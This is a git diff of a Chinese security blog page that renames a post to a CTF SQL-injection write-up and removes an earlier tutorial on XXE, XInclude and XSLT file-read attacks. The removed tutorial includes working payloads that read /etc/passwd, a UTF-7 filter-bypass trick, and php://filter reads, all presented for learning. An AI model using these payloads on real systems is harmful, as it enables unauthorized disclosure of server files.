@@ -15,7 +15,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>浅析xml之xinclude &amp; xslt · Sky&#39;s blog</title>
+    <title>一道CTF题引发的思考-sql注入 · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">浅析xml之xinclude & xslt</a>
+                <a href="#" class="post-name">一道CTF题引发的思考-sql注入</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            浅析xml之xinclude & xslt
+            一道CTF题引发的思考-sql注入
             <!-- 404 -->
             
         </h1>
@@ -261,12 +261,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,580</span> / Reading time: <span class="post-count">12 min</span></span>
+                        <span>Word count: <span class="post-count">1,556</span> / Reading time: <span class="post-count">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/23</span>
+                    <span class="post-intro-time">2018/08/16</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -391,77 +391,36 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <blockquote>
-<p>文章首发在安全客：<a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a></p>
+<p>文章首发在 <a href="https://xz.aliyun.com/t/2583" target="_blank" rel="noopener">https://xz.aliyun.com/t/2583</a></p>
 </blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近依旧在研究xml及其相关安全问题<br>前一篇文章已经提及了较为大众且CTF中常见的xml攻击方式<br>这里再提两个较为小众的攻击方式（此处小众是指CTF比赛中不常见）</p>
-<h2 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h2><h3 id="什么是xinclude？"><a href="#什么是xinclude？" class="headerlink" title="什么是xinclude？"></a>什么是xinclude？</h3><p>顾名思义，xinclude可以理解为xml include<br>熟悉编译/脚本语言的一定熟知，像php的include，python和java的import都是可以进行文件包含的。<br>那么文件包含有什么好处？<br>当然是可以使代码更整洁，我们可以将定义的功能函数放在function.php中，再在需要使用功能函数的文件中使用include包含function.php，这样就避免了重复冗余的函数定义，同样可以增加代码的可读性<br>故此，xinclude也不例外，它是xml标记语言中包含其他文件的方式</p>
-<h3 id="为什么使用xinclude"><a href="#为什么使用xinclude" class="headerlink" title="为什么使用xinclude"></a>为什么使用xinclude</h3><p>正如如上所说，xinclude可以使代码可读性更高，这里给出官方手册中的样例，便于理解：<br>page.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">webpage</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"templates/footer.xml"</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2003/XInclude"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">webpage</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>footer.xml:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span>? Contoso Corp, 2003<span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>处理过程<br><img src="/images/2018-08-13-10-55-48.png" alt=""></p>
-<h3 id="xinclude的语法介绍"><a href="#xinclude的语法介绍" class="headerlink" title="xinclude的语法介绍"></a>xinclude的语法介绍</h3><p>xinclude的语法相对来说，非常简单，只是在<code>http://www.w3.org/2003/XInclude</code>命名空间中的两个元素，即 include 和 fallback<br>常用的命名空间前缀是“xi”(但可以根据喜好自由使用任何前缀)</p>
-<h4 id="xi-include-元素"><a href="#xi-include-元素" class="headerlink" title="xi:include 元素"></a>xi:include 元素</h4><p>元素中的几个属性:</p>
-<ul>
-<li>href — 对要包括的文档的 URI 引用。</li>
-<li>parse — 它的值可以是“xml”或“text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是“xml”。</li>
-<li>xpointer — 这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。</li>
-<li>encoding — 作为文本包括时，该属性提供所包括文档的编码提示信息。<br>样例如下：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"test.xml"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="xi-fallback-元素"><a href="#xi-fallback-元素" class="headerlink" title="xi:fallback 元素"></a>xi:fallback 元素</h4><p>简单而言，类似于<code>try...except...</code>，如果xinclude的内容出现问题，则显示fallback的内容<br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"test.xml"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span>Sorry, the file is unavailable<span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>此时解析xml后，若test.xml不存在，则会解析获取到<code>Sorry, the file is unavailable</code></p>
-<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>看完上述内容，一定会有人问，为什么不直接使用外部实体引入就好了？<br>这里官方文档也给出了详尽的解释：<br>XML 外部实体有很多众所周知的局限和不便于使用的含义，这些因素极大地妨碍了 XML 外部实体成为多用途包含工具：</p>
-<ul>
-<li>XML 外部实体无法成为一个成熟的独立 XML 文档，因为它既不允许独立的 XML 声明，也不允许 Doctype 声明。这实际上意味着 XML 外部实体本身无法包括其他外部实体。</li>
-<li>XML 外部实体必须是格式规范的 XML</li>
-<li>未能加载外部实体是重大错误 (fatal error)；严格禁止任何恢复。</li>
-<li>只能包括整个外部实体，无法只包括文档的一部分。</li>
-<li><p>外部实体必须在 DTD 或内部子集中进行声明。<br>等等，外部实体？讲到安全问题，你是否立刻就想到了XXE（XML External Entity Injection）任意文件读取的问题？<br>没错，xinclude作为外部实体引用的替代品，同样具有XXE的问题，并且还有一些特别的地方：</p>
-<h4 id="传统的XXE文件读取"><a href="#传统的XXE文件读取" class="headerlink" title="传统的XXE文件读取"></a>传统的XXE文件读取</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;?xml version = "1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;f;&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="comment">// let's have a nice output</span></span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line"><span class="comment">// load the XML string defined above</span></span><br><span class="line">$dom-&gt;loadXML($xml);</span><br><span class="line"><span class="comment">// substitute xincludes</span></span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>但是访问该页面，我们却发现并没有解析xml<br><img src="/images/2018-08-13-11-26-06.png" alt=""><br>这是因为<br>php的xml库的底层库是libxml2，而在2.6版本之后，改库已默认禁用外部实体引用的解析<br>我们可以使用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> LIBXML_DOTTED_VERSION;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>来查看当前版本号<br><img src="/images/2018-08-13-11-36-00.png" alt=""><br>所以我当前的xml解析已默认不支持外部实体引入了<br>故此我们查阅php手册中的<code>libxml option constants</code><br>可以发现使用<code>LIBXML_NOENT</code>选项即可加载外部实体<br>所以关键代码更改为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT);</span><br></pre></td></tr></table></figure></p>
-<p>即可：<br><img src="/images/2018-08-13-11-34-24.png" alt=""></p>
-<h4 id="传统文件读取进阶版—过滤"><a href="#传统文件读取进阶版—过滤" class="headerlink" title="传统文件读取进阶版—过滤"></a>传统文件读取进阶版—过滤</h4><p>倘若我们发现外部实体引入时，存在关键词过滤<br>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENTITY</span><br></pre></td></tr></table></figure></p>
-<p>等被过滤，那么我们可以尝试使用utf-7编码<br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;f;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>我们利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.motobit.com/util/charset-codepage-conversion.asp</span><br></pre></td></tr></table></figure></p>
-<p>转为utf-7<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+ADwAIQ-DOCTYPE ANY +AFs-</span><br><span class="line">    +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span><br><span class="line">+AF0APg-</span><br><span class="line">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span><br></pre></td></tr></table></figure></p>
-<p>然后使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot; ?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>测试脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-7"?&gt;</span></span><br><span class="line"><span class="string">+ADwAIQ-DOCTYPE ANY +AFs-</span></span><br><span class="line"><span class="string">    +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span></span><br><span class="line"><span class="string">+AF0APg-</span></span><br><span class="line"><span class="string">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line"></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="comment">// let's have a nice output</span></span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>效果如下<br><img src="/images/2018-08-13-11-51-03.png" alt=""></p>
-<h4 id="xinclude文件读取"><a href="#xinclude文件读取" class="headerlink" title="xinclude文件读取"></a>xinclude文件读取</h4><p>倘若由于需要，我们使用了xinclude<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="string">&lt;root xmlns:xi="http://www.w3.org/2001/XInclude"&gt;</span></span><br><span class="line"><span class="string"> &lt;xi:include href="file:///etc/passwd" parse="text"/&gt;</span></span><br><span class="line"><span class="string">&lt;/root&gt;</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="comment">// let's have a nice output</span></span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line">$dom-&gt;loadXML($xml);</span><br><span class="line">$dom-&gt;xinclude();</span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>我们发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dom-&gt;loadXML($xml);</span><br></pre></td></tr></table></figure></p>
-<p>我们并没有打开外部实体引用选项，却成功的读取<code>/etc/passwd</code>的内容<br><img src="/images/2018-08-13-11-51-46.png" alt=""><br>这一点值得关注，倘若我们在测试过程中，发现我们可控xml文本内容，但是引入外部实体无效或是存在过滤，尝试编码绕过也不行的时候，那么可以尝试使用xinclude<br>因为xinclude无需使用<code>LIBXML_NOENT</code>选项去开启默认关闭的外部实体引用</p>
-<h2 id="XSLT"><a href="#XSLT" class="headerlink" title="XSLT"></a>XSLT</h2><p>XSL 指扩展样式表语言（EXtensible Stylesheet Language）<br>而XSLT 指 XSL 转换：即使用 XSLT 可将 XML 文档转换为其他文档，比如XHTML。</p>
-<h3 id="简单样例"><a href="#简单样例" class="headerlink" title="简单样例"></a>简单样例</h3><p>下面展示利用php后端语言，将xml转换为html<br>test.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>sky<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">blog</span>&gt;</span>skysec.top<span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">country</span>&gt;</span>China<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>test.xsl<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"#9acd32"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Country<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"blog"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"country"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$xslDoc = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$xslDoc-&gt;load(<span class="string">"test.xsl"</span>);</span><br><span class="line">$xmlDoc = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$xmlDoc-&gt;load(<span class="string">"test.xml"</span>);</span><br><span class="line">$proc = <span class="keyword">new</span> XSLTProcessor();</span><br><span class="line">$proc-&gt;importStylesheet($xslDoc);</span><br><span class="line"><span class="keyword">echo</span> $proc-&gt;transformToXML($xmlDoc);</span><br></pre></td></tr></table></figure></p>
-<p>结果如下<br><img src="/images/2018-08-13-14-41-42.png" alt=""><br>查看源代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"#9acd32"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Country<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>sky<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>skysec.top<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>China<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>发现<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"blog"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"country"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>已被替换成对应的值</p>
-<h3 id="安全问题-1"><a href="#安全问题-1" class="headerlink" title="安全问题"></a>安全问题</h3><h4 id="传统文件读取"><a href="#传统文件读取" class="headerlink" title="传统文件读取"></a>传统文件读取</h4><p>这里的安全问题基本与xml中相同<br>像读文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY shit SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"&gt;   </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/root"</span>&gt;</span></span><br><span class="line">  &amp;shit;</span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/2018-08-13-15-57-43.png" alt=""><br>这就很成功的可以读取文件内容了<br>但是需要注意的是，同样因为php底层的libxml库默认禁用了外部实体引入，所以我们还是需要手动加入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$xslDoc = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$xslDoc-&gt;load(<span class="string">"test.xsl"</span>,LIBXML_NOENT);</span><br></pre></td></tr></table></figure></p>
-<h4 id="xsl文件读取"><a href="#xsl文件读取" class="headerlink" title="xsl文件读取"></a>xsl文件读取</h4><p>当没开启外部实体引入的时候，我们可以考虑如下方式</p>
-<ul>
-<li><a href="xsl:include" target="_blank" rel="noopener">xsl:include</a>  / <a href="xsl:import" target="_blank" rel="noopener">xsl:import</a><br>查阅手册，发现该元素必须是 <a href="xsl:stylesheet" target="_blank" rel="noopener">xsl:stylesheet</a> 或 <a href="xsl:transform" target="_blank" rel="noopener">xsl:transform</a> 的子节点<br>语法为<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"URI"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>既然是url，那么利用的方式就有很多种了<br>例如：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>此时报错了<br><img src="/images/2018-08-13-15-29-11.png" alt=""><br>我们尝试用base64<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"php://filter/read=convert.base64-encode/resource=/etc/passwd"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/2018-08-13-15-30-07.png" alt=""><br>解base64<br><img src="/images/2018-08-13-15-30-35.png" alt=""><br>这很不爽，因为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $proc-&gt;transformToXML($xmlDoc)</span><br></pre></td></tr></table></figure></p>
